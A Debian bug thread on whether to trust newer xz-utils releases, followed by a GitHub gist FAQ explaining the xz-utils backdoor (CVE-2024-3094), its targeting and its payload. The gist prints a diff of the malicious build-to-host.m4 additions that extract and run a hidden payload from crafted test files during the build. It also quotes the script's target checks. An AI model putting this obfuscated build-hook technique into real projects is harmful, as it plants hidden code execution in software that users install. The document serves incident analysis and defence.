HEAD is now at 8dfed05b Bump version and soname for 5.2.6.

$ git log --stat --graph |grep "Jia" |wc
     16     129     774

# Two commits and several 'Thanks to ... '.

Cheers
Boud

PS: For any RedHat people reading this thread: unfortunately, 5.2.5 is
before the fix 31d80c6b that Lasse Collin did to handle the "ill patch"
introduced by RHEL/CentOS7:

  <https://salsa.debian.org/debian/xz-utils/-/commit/31d80c6b261b24220776dfaeb8a04f80f80e0a24>

That's a RHEL problem to handle, not a Debian problem.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Mon, 22 Apr 2024 23:51:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=159), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=159), [link](#158)).

---

**Acknowledgement sent**
to `Thorsten Glaser <tg@mirbsd.de>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Mon, 22 Apr 2024 23:51:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=161), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=161), [link](#160)).

---

[Message #162](#162) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=162), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=162), reply):

![](/cgi-bin/libravatar.cgi?email=tg%40mirbsd.de)
From: Thorsten Glaser <tg@mirbsd.de>
To: Christoph Anton Mitterer <calestyo@scientia.org>, 1068024@bugs.debian.org
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Mon, 22 Apr 2024 23:43:21 +0000 (UTC)
```
Christoph Anton Mitterer dixit:

>So Thorsten, in case you or someone else is aware of any [intermediate]
>results from these task forces ([9[) it would be nice to hear about
>them or better even in form of some "official" statement from Debian.

JFTR I’m not involved in those myself.

bye,
//mirabilos
--
When he found out that the m68k port was in a pretty bad shape, he did
not, like many before him, shrug and move on; instead, he took it upon
himself to start compiling things, just so he could compile his shell.
How's that for dedication. -- Wouter, about my Debian/m68k revival

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Sebastian Andrzej Siewior <sebastian@breakpoint.cc>`:

`Bug#1068024`; Package `xz-utils`.
(Thu, 24 Oct 2024 21:51:01 GMT) ([full text](bugreport.cgi?bug=1068024;msg=164), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=164), [link](#163)).

---

**Acknowledgement sent**
to `Thorsten Glaser <tg@evolvis.org>`:

Extra info received and forwarded to list. Copy sent to `Sebastian Andrzej Siewior <sebastian@breakpoint.cc>`.
(Thu, 24 Oct 2024 21:51:01 GMT) ([full text](bugreport.cgi?bug=1068024;msg=166), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=166), [link](#165)).

---

[Message #167](#167) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=167), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=167), reply):

![](/cgi-bin/libravatar.cgi?email=tg%40evolvis.org)
From: Thorsten Glaser <tg@evolvis.org>
To: 1068024@bugs.debian.org, team@security.debian.org
Subject: Fwd: Accepted xz-utils 5.6.3-1 (source) into unstable
Date: Thu, 24 Oct 2024 23:38:31 +0200 (CEST)
```
Do we trust these newer versions now?

---------- Forwarded message ----------
From: Debian FTP Masters <ftpmaster@ftp-master.debian.org>
Message-ID: <E1t45FX-00310k-9U@fasolo.debian.org>
To: debian-devel-changes@lists.debian.org
Date: Thu, 24 Oct 2024 21:20:07 +0000
Subject: Accepted xz-utils 5.6.3-1 (source) into unstable
Reply-To: Sebastian Andrzej Siewior <sebastian@breakpoint.cc>
X-Spam-Status: No, hits=0.000000 required=0.900000

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Format: 1.8
Date: Thu, 24 Oct 2024 21:27:12 +0200
Source: xz-utils
Architecture: source
Version: 5.6.3-1
Distribution: unstable
Urgency: medium
Maintainer: Sebastian Andrzej Siewior <sebastian@breakpoint.cc>
Changed-By: Sebastian Andrzej Siewior <sebastian@breakpoint.cc>
Changes:
 xz-utils (5.6.3-1) unstable; urgency=medium
 .
   * Import 5.6.3
Checksums-Sha1:
 3afd35029f779f0798ccd8aa1e268d5611b0d06e 2704 xz-utils_5.6.3-1.dsc
 1478dd581c363ab0ba465d95e892da83ab1ea82d 1328224 xz-utils_5.6.3.orig.tar.xz
 189462e15ece76cf02c26bb4fbc1e3ff0e268365 833 xz-utils_5.6.3.orig.tar.xz.asc
 f4aa5809b72f6d7986d5cc03c1f65a78db979afb 24548 xz-utils_5.6.3-1.debian.tar.xz
 43aeaf62e93e1049eff3d236623dc40bcb3615c9 883 xz-utils_5.6.3-1_source.buildinfo
Checksums-Sha256:
 840b9ae0e893d043de548c6df65a3a957dcd3977723eccf308ae8a61bb5dd288 2704 xz-utils_5.6.3-1.dsc
 db0590629b6f0fa36e74aea5f9731dc6f8df068ce7b7bafa45301832a5eebc3a 1328224 xz-utils_5.6.3.orig.tar.xz
 76b873c890e0b2cc0d3e790183d58acad724a8856a9ecb8491e127e5e5049837 833 xz-utils_5.6.3.orig.tar.xz.asc
 5de83aba4db209d8a30b9aaa390a8009086c42e1575a92182cb234c73c784f58 24548 xz-utils_5.6.3-1.debian.tar.xz
 2f09cc312a2e629410a40957a3ed96f197a840ea743910f46191d1be05d6ad5d 883 xz-utils_5.6.3-1_source.buildinfo
Files:
 dba3df0e319ae5fcb5c19504d7152faa 2704 utils optional xz-utils_5.6.3-1.dsc
 57581b216a82482503bb63c8170d549c 1328224 utils optional xz-utils_5.6.3.orig.tar.xz
 917ac0de183c038099e5ed2d271e1046 833 utils optional xz-utils_5.6.3.orig.tar.xz.asc
 b07a7c92d8440f24427207942c3d550c 24548 utils optional xz-utils_5.6.3-1.debian.tar.xz
 e9b5bb603896bce3170cfd92d67b707d 883 utils optional xz-utils_5.6.3-1_source.buildinfo

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEZCVGlf/wqkRmzBnme5boFiqM9dEFAmcaodMACgkQe5boFiqM
9dGysw//QmVvSzPIF38qBw2e4j0Ievh0QivT8i2P91LdFjjXzbZGd377JYnh0qIC
tk0bRKaMhFVUV4Rsoy9/Rin8qmUXS1MAX/xtQnXS3+IOcKW7ufFdB5HkLst6/zL2
pAFO5uk/sb9hDbpFw/Hi4YbstXztWLbi1edu9dbYTHqkbs7/EN9kHsoelk1WYVKh
i79gnkcYJpRZSptYkOJ+hMvFdURiyPHf2bbeE3uQKdRRWB+irrMT3bAFj+9ntJEy
4u9sxKt/TI3CL97EXSmt9bc5pEnkopktz5yrbTQ2SIJTcQisJ/al/9jRx/8N88Vy
bM67iQMhG5J0K6e0MXKED3TQxa617xvtEWUrRAqI9NsVWNxZXRRpsh5oXuoq6KkG
6/apo3Vg4kVOsshZELu7RMF87KVldYo5/McPsFMkiZ+fJlof30fDydl/+jqYTwaM
V//21StDu3QPL+ouLKkGaSAhEZqjTZam8PncKrBCbjVNf3mO0BqaLMESWOJ/Q26+
IEEHMswmOaWYYyFjNiuR9tthcKTmnp9PFxgNm4VuPEH1KBBIKNLT6kyOjwvhjvO2
8mRcCInmlbgqNiOpJfng3ZFT7+t+ZAkEisFBJxiS4DoICf2+3MBtF2FqXCWBjdTy
v25/NYuIf5djXoioef8pnejzsPM5WXg1OE1iCxK+cwWDdLFCo+4=
=5h95
-----END PGP SIGNATURE-----

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org`:

`Bug#1068024`; Package `xz-utils`.
(Fri, 25 Oct 2024 06:03:01 GMT) ([full text](bugreport.cgi?bug=1068024;msg=169), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=169), [link](#168)).

---

**Acknowledgement sent**
to `Sebastian Andrzej Siewior <sebastian@breakpoint.cc>`:

Extra info received and forwarded to list.
(Fri, 25 Oct 2024 06:03:01 GMT) ([full text](bugreport.cgi?bug=1068024;msg=171), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=171), [link](#170)).

---

[Message #172](#172) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=172), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=172), reply):

![](/cgi-bin/libravatar.cgi?email=sebastian%40breakpoint.cc)
From: Sebastian Andrzej Siewior <sebastian@breakpoint.cc>
To: Thorsten Glaser <tg@evolvis.org>, 1068024@bugs.debian.org
Cc: team@security.debian.org
Subject: Re: Bug#1068024: Fwd: Accepted xz-utils 5.6.3-1 (source) into
unstable
Date: Fri, 25 Oct 2024 08:00:22 +0200
```
On 2024-10-24 23:38:31 [+0200], Thorsten Glaser wrote:
> Do we trust these newer versions now?

Yes. We started with 5.6.2 which was audited by upstream after the
malicious party left.

Sebastian

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Sebastian Andrzej Siewior <sebastian@breakpoint.cc>`:

`Bug#1068024`; Package `xz-utils`.
(Fri, 25 Oct 2024 08:09:01 GMT) ([full text](bugreport.cgi?bug=1068024;msg=174), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=174), [link](#173)).

---

**Acknowledgement sent**
to `Moritz Mühlenhoff <jmm@inutil.org>`:

Extra info received and forwarded to list. Copy sent to `Sebastian Andrzej Siewior <sebastian@breakpoint.cc>`.
(Fri, 25 Oct 2024 08:09:01 GMT) ([full text](bugreport.cgi?bug=1068024;msg=176), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=176), [link](#175)).

---

[Message #177](#177) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=177), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=177), reply):

![](/cgi-bin/libravatar.cgi?email=jmm%40inutil.org)
From: Moritz Mühlenhoff <jmm@inutil.org>
To: Sebastian Andrzej Siewior <sebastian@breakpoint.cc>
Cc: Thorsten Glaser <tg@evolvis.org>, 1068024@bugs.debian.org,
team@security.debian.org
Subject: Re: Bug#1068024: Fwd: Accepted xz-utils 5.6.3-1 (source) into
unstable
Date: Fri, 25 Oct 2024 08:06:50 +0000
```
On Fri, Oct 25, 2024 at 08:00:22AM +0200, Sebastian Andrzej Siewior wrote:
> On 2024-10-24 23:38:31 [+0200], Thorsten Glaser wrote:
> > Do we trust these newer versions now?
>
> Yes. We started with 5.6.2 which was audited by upstream after the
> malicious party left.

The details can be found at <https://tukaani.org/xz-backdoor/review.html>

Cheers,
        Moritz

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Sebastian Andrzej Siewior <sebastian@breakpoint.cc>`:

`Bug#1068024`; Package `xz-utils`.
(Fri, 25 Oct 2024 21:09:01 GMT) ([full text](bugreport.cgi?bug=1068024;msg=179), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=179), [link](#178)).

---

**Acknowledgement sent**
to `Thorsten Glaser <tg@evolvis.org>`:

Extra info received and forwarded to list. Copy sent to `Sebastian Andrzej Siewior <sebastian@breakpoint.cc>`.
(Fri, 25 Oct 2024 21:09:01 GMT) ([full text](bugreport.cgi?bug=1068024;msg=181), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=181), [link](#180)).

---

[Message #182](#182) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=182), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=182), reply):

![](/cgi-bin/libravatar.cgi?email=tg%40evolvis.org)
From: Thorsten Glaser <tg@evolvis.org>
To: Moritz Mühlenhoff <jmm@inutil.org>
Cc: Sebastian Andrzej Siewior <sebastian@breakpoint.cc>,
1068024@bugs.debian.org, team@security.debian.org
Subject: Re: Bug#1068024: Fwd: Accepted xz-utils 5.6.3-1 (source) into
unstable
Date: Fri, 25 Oct 2024 23:06:07 +0200 (CEST)
```
On Fri, 25 Oct 2024, Moritz Mühlenhoff wrote:
>On Fri, Oct 25, 2024 at 08:00:22AM +0200, Sebastian Andrzej Siewior wrote:
>> On 2024-10-24 23:38:31 [+0200], Thorsten Glaser wrote:
>> > Do we trust these newer versions now?
>>
>> Yes. We started with 5.6.2 which was audited by upstream after the
>> malicious party left.
>
>The details can be found at <https://tukaani.org/xz-backdoor/review.html>

Ah, thanks, good read.

bye,
//mirabilos
--
  "Using Lynx is like wearing a really good pair of shades: cuts out
   the glare and harmful UV (ultra-vanity), and you feel so-o-o COOL."
                                         -- Henry Nelson, March 1999

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Sebastian Andrzej Siewior <sebastian@breakpoint.cc>`:

`Bug#1068024`; Package `xz-utils`.
(Fri, 25 Oct 2024 21:24:01 GMT) ([full text](bugreport.cgi?bug=1068024;msg=184), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=184), [link](#183)).

---

**Acknowledgement sent**
to `Christoph Anton Mitterer <calestyo@scientia.org>`:

Extra info received and forwarded to list. Copy sent to `Sebastian Andrzej Siewior <sebastian@breakpoint.cc>`.
(Fri, 25 Oct 2024 21:24:01 GMT) ([full text](bugreport.cgi?bug=1068024;msg=186), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=186), [link](#185)).

---

[Message #187](#187) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=187), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=187), reply):

![](/cgi-bin/libravatar.cgi?email=calestyo%40scientia.org)
From: Christoph Anton Mitterer <calestyo@scientia.org>
To: 1068024@bugs.debian.org
Subject: Re: Bug#1068024: Fwd: Accepted xz-utils 5.6.3-1 (source) into
unstable
Date: Fri, 25 Oct 2024 23:21:45 +0200
```
I guess this bug can be closed, can't it?

If the version that Debian has reverted to after the backdoor was
disclosed or any of the supposedly cleaned versions would have still
had any malicious code in it, it would anyway be useless by now, to
revert to an even older version.

Cheers,
Chris

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Sebastian Andrzej Siewior <sebastian@breakpoint.cc>`:

`Bug#1068024`; Package `xz-utils`.
(Fri, 25 Oct 2024 21:45:01 GMT) ([full text](bugreport.cgi?bug=1068024;msg=189), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=189), [link](#188)).

---

**Acknowledgement sent**
to `Thorsten Glaser <tg@evolvis.org>`:

Extra info received and forwarded to list. Copy sent to `Sebastian Andrzej Siewior <sebastian@breakpoint.cc>`.
(Fri, 25 Oct 2024 21:45:01 GMT) ([full text](bugreport.cgi?bug=1068024;msg=191), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=191), [link](#190)).

---

[Message #192](#192) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=192), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=192), reply):

![](/cgi-bin/libravatar.cgi?email=tg%40evolvis.org)
From: Thorsten Glaser <tg@evolvis.org>
To: 1068024-submitter@bugs.debian.org,
Christoph Anton Mitterer <calestyo@scientia.org>, 1068024@bugs.debian.org
Subject: Re: Bug#1068024: Fwd: Accepted xz-utils 5.6.3-1 (source) into
unstable
Date: Fri, 25 Oct 2024 23:40:22 +0200 (CEST)
```
On Fri, 25 Oct 2024, Christoph Anton Mitterer wrote:

>I guess this bug can be closed, can't it?

Let’s take the submitter into explict Cc, to get an extra
opinion.

>If the version that Debian has reverted to after the backdoor was
>disclosed or any of the supposedly cleaned versions would have still
>had any malicious code in it, it would anyway be useless by now, to
>revert to an even older version.

Not necessarily, but we’ll see.

bye,
//mirabilos
--
/⁀\ The UTF-8 Ribbon
╲ ╱ Campaign against
 ╳  HTML eMail! Also,
╱ ╲ header encryption!

```

---

**Message sent on**
to `Joey Hess <id@joeyh.name>`:

Bug#1068024.
(Fri, 25 Oct 2024 21:51:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=194), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=194), [link](#193)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=1068024).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Sat Jan 11 03:40:09 2025;
Machine Name:
bembo

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from gist.github.com_b162e3e3_20250111_034015.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@thesamesam](https://avatars.githubusercontent.com/u/11667869?s=64&v=4)](/thesamesam)

# [thesamesam](/thesamesam)/**[xz-backdoor.md](/thesamesam/223949d5a074ebc3dce9ee78baad9e27)**

Last active
January 2, 2025 15:08

Show Gist options

* [Download ZIP](/thesamesam/223949d5a074ebc3dce9ee78baad9e27/archive/229a2e0548b629b6154eac6ddc52f33b85ce4c9a.zip)

* [Star
  (1,346)
  1,346](/login?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27)You must be signed in to star a gist
* [Fork
  (64)
  64](/login?return_to=https%3A%2F%2Fgist.github.com%2Fthesamesam%2F223949d5a074ebc3dce9ee78baad9e27)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27.js&quot;&gt;&lt;/script&gt;
* Save thesamesam/223949d5a074ebc3dce9ee78baad9e27 to your computer and use it in GitHub Desktop.

[Code](/thesamesam/223949d5a074ebc3dce9ee78baad9e27)
[Revisions
171](/thesamesam/223949d5a074ebc3dce9ee78baad9e27/revisions)
[Stars
1,343](/thesamesam/223949d5a074ebc3dce9ee78baad9e27/stargazers)
[Forks
64](/thesamesam/223949d5a074ebc3dce9ee78baad9e27/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27.js&quot;&gt;&lt;/script&gt;

Save thesamesam/223949d5a074ebc3dce9ee78baad9e27 to your computer and use it in GitHub Desktop.

[Download ZIP](/thesamesam/223949d5a074ebc3dce9ee78baad9e27/archive/229a2e0548b629b6154eac6ddc52f33b85ce4c9a.zip)

xz-utils backdoor situation (CVE-2024-3094)

 [Raw](/thesamesam/223949d5a074ebc3dce9ee78baad9e27/raw/229a2e0548b629b6154eac6ddc52f33b85ce4c9a/xz-backdoor.md)

[**xz-backdoor.md**](#file-xz-backdoor-md)

# FAQ on the xz-utils backdoor (CVE-2024-3094)

This is a living document. Everything in this document is made in good
faith of being accurate, but like I just said; we don't yet know everything
about what's going on.

## Background

On March 29th, 2024, a backdoor was discovered in
[xz-utils](https://tukaani.org/xz/), a suite of software that
gives developers lossless compression. This package is commonly used
for compressing release tarballs, software packages, kernel images,
and initramfs images. It is very widely distributed, statistically
your average Linux or macOS system will have it installed for
convenience.

This backdoor is very indirect and only shows up when a few *known* specific
criteria are met. Others may be yet discovered! However, this backdoor is *at least*
triggerable by remote unprivileged systems connecting to public SSH ports. This has been
seen in the wild where it gets activated by connections - resulting in performance
issues, but we do not know yet what is required to bypass authentication (etc) with it.

We're reasonably sure the following things need to be true for your system
to be vulnerable:

* You need to be running a distro that uses glibc (for IFUNC)
* You need to have versions 5.6.0 or 5.6.1 of xz or liblzma installed
  (xz-utils provides the library liblzma) - likely only true if
  running a rolling-release distro and updating religiously.

We know that the combination of *systemd* and *patched openssh* are
vulnerable but pending further analysis of the payload, we cannot
be certain that other configurations aren't.

While not scaremongering, it is important to be clear that **at this stage,
we got lucky, and there may well be other effects of the infected liblzma**.

If you're running a publicly accessible `sshd`, then you are - as a rule
of thumb for those not wanting to read the rest here - likely vulnerable.

If you aren't, it is unknown for now, but you should update as quickly as possible
because investigations are continuing.

TL:DR:

* Using a `.deb` or `.rpm` based distro with glibc and xz-5.6.0 or xz-5.6.1:
  + Using systemd on publicly accessible ssh: update RIGHT NOW NOW NOW
  + Otherwise: update RIGHT NOW NOW but prioritize the former
* Using another type of distribution:
  + With glibc and xz-5.6.0 or xz-5.6.1: update RIGHT NOW, but prioritize the above.

If all of these are the case, please update your systems to mitigate
this threat. For more information about affected systems and how to
update, please see [this
article](https://xeiaso.net/notes/2024/xz-vuln/) or check the
[xz-utils page on Repology](https://repology.org/project/xz/versions).

This is not a fault of sshd, systemd, or glibc, that is just how it
was made exploitable.

## Design

This backdoor has several components. At a high level:

* The release tarballs upstream publishes don't have the same code
  that GitHub has. This is common in C projects so that downstream
  consumers don't need to remember how to run autotools and autoconf.
  The version of `build-to-host.m4` in the release tarballs differs
  wildly from the upstream on GitHub.
* There are crafted test files in the `tests/` folder within the git repository too.
  These files are in the following commits:
  + `tests/files/bad-3-corrupt_lzma2.xz` ([cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0](https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0), [74b138d2a6529f2c07729d7c77b1725a8e8b16f1](https://github.com/tukaani-project/xz/commit/74b138d2a6529f2c07729d7c77b1725a8e8b16f1))
  + `tests/files/good-large_compressed.lzma`
    ([cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0](https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0),
    [74b138d2a6529f2c07729d7c77b1725a8e8b16f1](https://github.com/tukaani-project/xz/commit/74b138d2a6529f2c07729d7c77b1725a8e8b16f1))
* Note that the bad commits have since been reverted in [e93e13c8b3bec925c56e0c0b675d8000a0f7f754](https://github.com/tukaani-project/xz/commit/e93e13c8b3bec925c56e0c0b675d8000a0f7f754)
* A script called by `build-to-host.m4` that unpacks this malicious
  test data and uses it to modify the build process.
* IFUNC, a mechanism in glibc that allows for indirect function calls,
  is used to perform runtime hooking/redirection of OpenSSH's
  authentication routines. IFUNC is a tool that is normally used for
  legitimate things, but in this case it is exploited for this attack
  path.

Normally upstream publishes release tarballs that are different than
the automatically generated ones in GitHub. In these modified
tarballs, a malicious version of `build-to-host.m4` is included to
execute a script during the build process.

This script (at least in versions 5.6.0 and 5.6.1) checks for various
conditions like the architecture of the machine. Here is a snippet of
the malicious script that gets unpacked by `build-to-host.m4` and an
explanation of what it does:

> `if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then`

* If amd64/x86\_64 is the target of the build
* And if the target uses the name `linux-gnu` (mostly checks for the
  use of glibc)

It also checks for the toolchain being used:

> ```
>   if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
>   exit 0
>   fi
>   if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
>   exit 0
>   fi
>   LDv=$LD" -v"
>   if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
>   exit 0
>
> ```

And if you are trying to build a Debian or Red Hat package:

> `if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then`

This attack thusly seems to be targeted at amd64 systems running glibc
using either Debian or Red Hat derived distributions. Other systems
may be vulnerable at this time, but we don't know.

Lasse Collin, the original long-standing xz maintainer, is currently working on
auditing the `xz.git`.

## Design specifics

```
$ git diff m4/build-to-host.m4 ~/data/xz/xz-5.6.1/m4/build-to-host.m4
diff --git a/m4/build-to-host.m4 b/home/sam/data/xz/xz-5.6.1/m4/build-to-host.m4
index f928e9ab..d5ec3153 100644
--- a/m4/build-to-host.m4
+++ b/home/sam/data/xz/xz-5.6.1/m4/build-to-host.m4
@@ -1,4 +1,4 @@
-# build-to-host.m4 serial 3
+# build-to-host.m4 serial 30
 dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
 dnl This file is free software; the Free Software Foundation
 dnl gives unlimited permission to copy and/or distribute it,
@@ -37,6 +37,7 @@ AC_DEFUN([gl_BUILD_TO_HOST],

   dnl Define somedir_c.
   gl_final_[$1]="$[$1]"
+  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
   dnl Translate it from build syntax to host syntax.
   case "$build_os" in
     cygwin*)
@@ -58,14 +59,40 @@ AC_DEFUN([gl_BUILD_TO_HOST],
   if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
     [$1]_c_make='\"$([$1])\"'
   fi
+  if test "x$gl_am_configmake" != "x"; then
+    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
+  else
+    gl_[$1]_config=''
+  fi
+  _LT_TAGDECL([], [gl_path_map], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl
+  _LT_TAGDECL([], [gl_am_configmake], [2])dnl
+  _LT_TAGDECL([], [[$1]_c_make], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl
   AC_SUBST([$1_c_make])
+
+  dnl If the host conversion code has been placed in $gl_config_gt,
+  dnl instead of duplicating it all over again into config.status,
+  dnl then we will have config.status run $gl_config_gt later, so it
+  dnl needs to know what name is stored there:
+  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
 ])

 dnl Some initializations for gl_BUILD_TO_HOST.
 AC_DEFUN([gl_BUILD_TO_HOST_INIT],
 [
+  dnl Search for Automake-defined pkg* macros, in the order
+  dnl listed in the Automake 1.10a+ documentation.
+  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
+  if test -n "$gl_am_configmake"; then
+    HAVE_PKG_CONFIGMAKE=1
+  else
+    HAVE_PKG_CONFIGMAKE=0
+  fi
+
   gl_sed_double_backslashes='s/\\/\\\\/g'
   gl_sed_escape_doublequotes='s/"/\\"/g'
+  gl_path_map='tr "\t \-_" " \t_\-"'
 changequote(,)dnl
   gl_sed_escape_for_make_1="s,\\([ \"&'();<>\\\\\`|]\\),\\\\\\1,g"
 changequote([,])dnl
```

## Payload

If those conditions check, the payload is injected into the source
tree. We have not analyzed this payload in detail. Here are the main
things we know:

* The payload activates if the running program has the process
  name `/usr/sbin/sshd`. Systems that put `sshd` in
  `/usr/bin` or another folder may or may not be vulnerable.
* It may activate in other scenarios too, possibly even unrelated to ssh.
* We don't entirely know the payload is intended to do. We are
  investigating.
* Successful exploitation does not generate any log entries.
* Vanilla upstream OpenSSH isn't affected unless one of its
  dependencies links `liblzma`.

  + Lennart Poettering had [mentioned](https://news.ycombinator.com/item?id=39867126) that it may happen
    via pam->libselinux->liblzma, and possibly in other cases too, but...
  + libselinux does not link to liblzma. It turns out the confusion was because of an old downstream-only patch in Fedora and a stale dependency in the RPM spec which persisted long-beyond its removal.
  + PAM modules are loaded too late in the process AFAIK for this to work (another possible example was `pam_fprintd`). Solar Designer [raised this issue](https://openwall.com/lists/oss-security/2024/03/31/9) as well on *oss-security*.
* The payload is loaded into `sshd` indirectly. `sshd` is often patched
  to support
  [systemd-notify](https://www.freedesktop.org/software/systemd/man/249/systemd-notify.html)
  so that other services can start when sshd is running. `liblzma` is
  loaded because it's depended on by other parts of `libsystemd`. This
  is not the fault of systemd, this is more unfortunate. The patch
  that most distributions use is available here:
  [openssh/openssh-portable#375](https://github.com/openssh/openssh-portable/pull/375).

  + *Update*: The OpenSSH developers have added [non-library integration](https://bugzilla.mindrot.org/show_bug.cgi?id=2641#c33) of the systemd-notify protocol so distributions won't be patching it in via `libsystemd` support anymore. This change has been committed and will land in OpenSSH-9.8, due around June/July 2024.
* If this payload is loaded in openssh `sshd`, the
  `RSA_public_decrypt` function will be redirected into a malicious
  implementation. We have observed that this malicious implementation
  can be used to bypass authentication. ~~Further research is being done
  to explain why.~~

  + Filippo Valsorda has shared [analysis](https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b) indicating that the attacker must supply a key which is verified by the payload and then attacker input is passed to `system()`, giving remote code execution (RCE).

## Tangential xz bits

* Jia Tan's [328c52da8a2bbb81307644efdb58db2c422d9ba7](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=328c52da8a2bbb81307644efdb58db2c422d9ba7) commit contained a `.` in the CMake check for landlock sandboxing support. This caused the check to always fail so landlock support was detected as absent.

  + Hardening of CMake's `check_c_source_compiles` has been proposed (see *Other projects*).
* IFUNC was introduced for *crc64* in [ee44863ae88e377a5df10db007ba9bfadde3d314](https://git.tukaani.org/?p=xz.git;a=commit;h=ee44863ae88e377a5df10db007ba9bfadde3d314) by *Hans Jansen*.

